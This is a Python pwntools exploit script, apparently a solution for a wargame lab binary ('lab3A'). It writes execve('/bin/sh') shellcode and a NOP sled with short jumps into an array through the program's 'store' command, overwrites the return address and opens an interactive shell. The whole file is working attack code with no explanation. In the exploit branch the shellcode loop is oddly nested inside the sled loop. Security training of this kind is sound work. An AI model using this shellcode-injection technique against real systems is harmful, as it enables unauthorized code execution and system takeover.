#!/usr/bin/python
from pwn import *
import sys
EXPLOIT = 1
#context.bits = 32
#context.arch = 'i386'
#context.terminal = ['tmux','new-window']

shellcode = [0xD231C031,
             0x04EBC931,
             0x2F2F6850,
             0x04EB6873,
             0x69622F68,
             0x04EB906E,
             0x0BB0E389,
             0x04EB80CD,
             0x81CD01B0]

sled_size = 18
if EXPLOIT:
    # overwrite return addresss
    # 0xffffd0cc
    e = ELF('/levels/lab03/lab3A')
    io = process(e.path)
    #gdb.attach(io,'''
    #b main
    #b *main+553
    #''')
    addr = sys.argv[1]
    io.sendline(b'store')
    io.sendline(str(int(addr,16)))
    io.sendline('109')
# nop sled
    jmp = False
    for i in range(sled_size):
        if i % 3 != 0:
            if jmp:
                num = int(0x04EB9090)
            else:
                num = int(0x90909090)
            io.sendline(b'store')
            io.sendline(str(num))
            io.sendline(str(i))
            jmp = not jmp
        counter = 0
        for byte in shellcode:
            if (counter + sled_size) % 3 == 0:
                counter += 1
            io.sendline(b'store')
            io.sendline(str(int(byte)))
            io.sendline(str(sled_size + counter))
            counter += 1

    # io.sendline(b'store')
    # io.sendline(str(int(0xffffce64)))
    # io.sendline(str(1))
    io.sendline(b'quit')
    io.interactive()
else:
    # debugging with gdb
    addr = sys.argv[1]
    print('store')
    print('109')

# nop sled
    jmp = False
    for i in range(sled_size):
        if i % 3 != 0:
            if jmp:
                num = int(0x04EB9090)
            else:
                num = int(0x90909090)
            print('store')
            print(str(num))
            print(str(i))
            jmp = not jmp

    counter = 0
    for byte in shellcode:
        if (counter + sled_size) % 3 == 0:
            counter += 1
        print('store')
        print(str(int(byte)))
        print(str(sled_size + counter))
        counter += 1
